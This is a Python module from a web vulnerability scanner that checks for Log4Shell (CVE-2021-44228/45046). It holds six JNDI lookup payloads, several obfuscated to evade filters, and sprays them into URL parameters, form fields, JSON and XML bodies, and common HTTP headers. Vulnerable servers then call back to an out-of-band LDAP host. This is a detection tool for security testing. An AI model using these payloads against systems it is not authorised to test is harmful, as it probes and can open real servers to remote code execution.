"""
Log4Shell deep coverage — CVE-2021-44228 / CVE-2021-45046.

Injects JNDI payloads into every surface:
  - URL parameters
  - Form fields
  - JSON request bodies
  - XML request bodies
  - Common HTTP headers

The basic templates module already injects into a few headers on the root page.
This module covers every parameter and form field found across all crawled pages,
and uses OOB callbacks for blind detection.
"""
from __future__ import annotations

import json
from typing import List
from scanner.core.crawler import CrawlResult
from scanner.core.scan_result import Finding
from scanner.utils.http import get_url_params, inject_url_param

_JNDI_VARIANTS = [
    "${jndi:ldap://{{CANARY}}/log4j}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://{{CANARY}}/log4j}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://{{CANARY}}/log4j}",
    "${j${::-n}di:ldap://{{CANARY}}/log4j}",
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{{CANARY}}/log4j}",
    "${${upper:j}ndi:ldap://{{CANARY}}/log4j}",
]

_INJECT_HEADERS = [
    "X-Api-Version",
    "X-Forwarded-For",
    "X-Originating-IP",
    "Referer",
    "User-Agent",
    "Accept-Language",
    "X-Request-ID",
    "X-Correlation-ID",
    "CF-Connecting-IP",
    "True-Client-IP",
]

_CANARY_PLACEHOLDER = "{{CANARY}}"
_FALLBACK_CANARY = "log4j.kagesec.oast.pro"


def _make_payloads(canary: str) -> list[str]:
    return [v.replace(_CANARY_PLACEHOLDER, canary) for v in _JNDI_VARIANTS]


def test(page: CrawlResult, client, oob=None) -> List[Finding]:
    canary = oob.get_canary() if oob else _FALLBACK_CANARY
    payloads = _make_payloads(canary)
    findings: List[Finding] = []

    # URL parameters
    params = get_url_params(page.url)
    for param in params:
        for payload in payloads[:2]:
            url = inject_url_param(page.url, param, payload)
            try:
                client.get(url, timeout=6)
            except Exception:
                pass

    # Form fields
    for form in page.forms:
        inputs = [i["name"] for i in form["inputs"] if i["name"]]
        if not inputs:
            continue
        for payload in payloads[:2]:
            data = {name: payload for name in inputs}
            try:
                client.request(
                    form["method"].upper(), form["action"],
                    data=data, timeout=6,
                )
            except Exception:
                pass
            # Also try as JSON body
            try:
                client.post(
                    form["action"],
                    content=json.dumps(data),
                    headers={"Content-Type": "application/json"},
                    timeout=6,
                )
            except Exception:
                pass

    # HTTP headers on the page URL
    for payload in payloads[:3]:
        headers = {h: payload for h in _INJECT_HEADERS}
        try:
            client.get(page.url, headers=headers, timeout=6)
        except Exception:
            pass

    # XML body if there are forms accepting XML
    _try_xml_injection(page, client, payloads[0])

    return findings  # OOB callbacks reported by engine's _collect_oob_findings


def _try_xml_injection(page: CrawlResult, client, payload: str) -> None:
    xml_body = f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe "{payload}">
]>
<root>&xxe;</root>"""
    for form in page.forms:
        if form["method"].upper() == "POST":
            try:
                client.post(
                    form["action"],
                    content=xml_body,
                    headers={"Content-Type": "application/xml"},
                    timeout=6,
                )
            except Exception:
                pass
